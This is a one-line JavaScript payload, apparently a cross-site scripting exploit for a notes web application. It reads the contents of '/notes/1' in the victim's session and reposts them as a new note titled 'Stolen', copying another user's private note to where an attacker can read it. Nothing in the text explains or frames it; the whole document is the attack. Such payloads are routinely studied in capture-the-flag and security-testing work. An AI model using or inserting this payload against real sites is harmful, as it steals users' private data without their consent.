fetch('/notes/1').then(r=>r.text()).then(d=>fetch('/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=Stolen&content='+encodeURIComponent(d)}))
